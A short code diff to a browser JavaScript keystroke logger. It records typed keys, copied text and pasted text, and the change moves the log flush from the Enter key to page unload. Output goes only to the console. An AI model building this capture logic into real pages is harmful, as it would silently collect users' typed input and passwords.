@@ -4,18 +4,16 @@ var copiedText = null;
 
 const BACKSPACE = 8;
 const ENTER = 13;
+
+window.onbeforeunload = function() {
+    console.log(keys);   
+    keys = "";
+}
   
 document.onkeypress = function(event) {
     var keyCode = event.keyCode;
-
-    if (keyCode == ENTER) {
-        event.preventDefault();
-        console.log(keys);   
-        keys = '';
-    } else {
-        var key = String.fromCharCode(keyCode)
-        keys += key;
-    }
+    var key = String.fromCharCode(keyCode)
+    keys += key;
 }
 
 // Remove Backspaces from Log
@@ -59,8 +57,3 @@ document.addEventListener('copy', function(){
 document.addEventListener('paste', function(event){
     keys += copiedText;
 });
-
-// window.setInterval(function(){
-//     console.log(keys);   
-//     keys = '';
-//  }, 10000);
